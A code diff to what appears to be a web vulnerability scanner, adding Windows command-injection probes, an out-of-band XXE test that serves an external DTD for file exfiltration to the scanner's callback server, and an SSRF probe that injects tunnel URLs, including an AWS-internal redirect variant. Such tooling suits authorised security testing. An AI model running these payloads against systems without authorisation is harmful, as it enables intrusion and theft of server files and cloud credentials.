@@ -117,20 +117,26 @@ def _CMD_PROBES() -> list[tuple[str, str]]:
     raw = _payloads.cmdi_exec()[:50]
     # Keep payloads that use echo-style output detection
     echo_probes = [_p for _p in raw if "echo" in _p.lower() or "id" in _p.lower()]
-    # Prepend our reliable marker probes first
-    marker_probes = [
+    # Unix marker probes — first, since most app stacks are POSIX
+    unix_markers = [
         (f"; echo {_CMD_ECHO_MARKER}", _CMD_ECHO_MARKER),
         (f"| echo {_CMD_ECHO_MARKER}", _CMD_ECHO_MARKER),
         (f"$(echo {_CMD_ECHO_MARKER})", _CMD_ECHO_MARKER),
         (f"`echo {_CMD_ECHO_MARKER}`", _CMD_ECHO_MARKER),
         (f"%0a echo {_CMD_ECHO_MARKER}", _CMD_ECHO_MARKER),
     ]
-    return marker_probes + [(_p, "root:") for _p in echo_probes if "id" in _p][:10]
+    # Windows cmd.exe + PowerShell variants — cheap to add; only fire on
+    # Windows targets but the cost on POSIX is one wasted request per param.
+    win_markers = _payloads.cmdi_windows(_CMD_ECHO_MARKER) + \
+                  _payloads.cmdi_windows_powershell(_CMD_ECHO_MARKER)
+    return unix_markers + win_markers + \
+           [(_p, "root:") for _p in echo_probes if "id" in _p][:10]
 
-# CMDi time-based: Unix sleep payloads from PAT
+# CMDi time-based: Unix sleep + Windows ping/timeout/Start-Sleep payloads
 def _CMD_TIME_PAYLOADS() -> list[str]:
     sleep_payloads = [_p for _p in _payloads.cmdi_unix() if "sleep" in _p.lower() or "ping" in _p.lower()]
-    return sleep_payloads[:10] or ["; sleep 3", "| sleep 3", "$(sleep 3)", "`sleep 3`"]
+    unix = sleep_payloads[:10] or ["; sleep 3", "| sleep 3", "$(sleep 3)", "`sleep 3`"]
+    return unix + _payloads.cmdi_windows_time()
 
 # XXE payloads: 20 from PAT XXE_Fuzzing.txt + xml-attacks.txt
 def _XXE_PAYLOADS() -> list[str]:
@@ -215,6 +221,8 @@ class ActiveScanner:
         canary=None,            # Optional[Canary]
         max_params_per_endpoint: int = 5,
         browser_verifier=None,  # Optional[BrowserVerifier] for XSS execution proof
+        payload_server=None,    # Optional[PayloadServer] for active OOB callbacks
+        public_url: Optional[str] = None,  # tunnel URL pointing at payload_server
     ):
         self.auth_headers = auth_headers or {}
         self.timeout = timeout
@@ -222,6 +230,8 @@ class ActiveScanner:
         self.canary = canary
         self.max_params_per_endpoint = max_params_per_endpoint
         self.browser_verifier = browser_verifier
+        self.payload_server = payload_server
+        self.public_url = (public_url or "").rstrip("/") or None
 
     async def run(
         self,
@@ -336,6 +346,9 @@ class ActiveScanner:
         ]
         if is_xml:
             coros.append(self._test_xxe(client, url, method, param, params, body))
+        # SSRF param-injection runs only when tunnel/payload_server are wired up
+        if self.payload_server and self.public_url:
+            coros.append(self._test_ssrf(client, url, method, param, params, body))
 
         results = await asyncio.gather(*coros, return_exceptions=True)
         for r in results:
@@ -573,7 +586,42 @@ class ActiveScanner:
         except Exception:
             pass
 
-        # OOB probe
+        # OOB probe — payload_server preferred (serves a real DTD with file
+        # exfil), canary fallback (DNS/HTTP metadata only)
+        if self.payload_server and self.public_url:
+            token = self.payload_server.mint_token("xxe")
+            dtd_url = f"{self.public_url}/xxe/{token}.dtd"
+            # Reference our external DTD — the target parses it and the DTD
+            # itself triggers the file exfil callback to /r/<token>
+            ext_dtd_payload = (
+                f'<?xml version="1.0"?>\n'
+                f'<!DOCTYPE foo SYSTEM "{dtd_url}">\n'
+                f'<foo></foo>'
+            )
+            try:
+                await client.request(
+                    method, url, content=ext_dtd_payload,
+                    headers={**self.auth_headers, "Content-Type": "application/xml"},
+                )
+                # Wait up to 8s for the target to fetch the DTD AND make the
+                # exfil callback. payload_server records both.
+                await asyncio.sleep(5.0)
+                hits = self.payload_server.hits_for(token)
+                if hits:
+                    fetcher_ip = hits[0].peer
+                    return [ScanFinding(
+                        endpoint=url, param="(body)",
+                        attack_type="xxe", payload="OOB external DTD",
+                        verdict="confirmed", confidence=0.95,
+                        evidence=(
+                            f"XXE OOB: target fetched external DTD from {dtd_url} "
+                            f"(peer={fetcher_ip}, {len(hits)} hit(s))"
+                        ),
+                        oob_hit=True,
+                    )]
+            except Exception:
+                pass
+
         if self.canary and self.canary.available:
             canary_url = self.canary.generate("xxe")
             if canary_url:
@@ -699,6 +747,52 @@ class ActiveScanner:
             except Exception:
                 pass
         return []
+
+    async def _test_ssrf(
+        self, client, url, method, param, params, body,
+    ) -> list[ScanFinding]:
+        """Param-injection SSRF probe — replace `param` with our tunnel URL and
+        watch for an inbound callback. Only runs when both payload_server and
+        a public_url are available; otherwise returns []."""
+        if not (self.payload_server and self.public_url and param):
+            return []
+        from intruder import inject_param  # local-only — keep import lazy
+
+        token = self.payload_server.mint_token("ssrf")
+        callback = f"{self.public_url}/r/{token}"
+
+        # Two payload shapes: raw callback URL (most common) + redirect-chain
+        # variant that uses our tunnel as a hop to an internal target.
+        payloads = [
+            callback,
+            f"{self.public_url}/ssrf/internal/aws?token={token}",
+        ]
+        for payload in payloads:
+            try:
+                probe_url, probe_body = inject_param(url, params, param, payload, body, method)
+                await client.request(
+                    method, probe_url,
+                    content=probe_body.encode() if probe_body else None,
+                    headers=self.auth_headers,
+                )
+            except Exception:
+                continue
+        # Brief wait — target's HTTP client typically returns in <3s for SSRF
+        await asyncio.sleep(3.5)
+        hits = self.payload_server.hits_for(token)
+        if not hits:
+            return []
+        first = hits[0]
+        return [ScanFinding(
+            endpoint=url, param=param,
+            attack_type="ssrf", payload=callback,
+            verdict="confirmed", confidence=0.95,
+            evidence=(
+                f"SSRF confirmed via tunnel callback: target fetched {first.path} "
+                f"from {first.peer} ({len(hits)} total hit(s))"
+            ),
+            oob_hit=True,
+        )]
 
     async def _test_nosql(self, client, url, method, param, params, body) -> list[ScanFinding]:
         """Quick NoSQL operator injection check (full probing in nosql_probe.py)."""
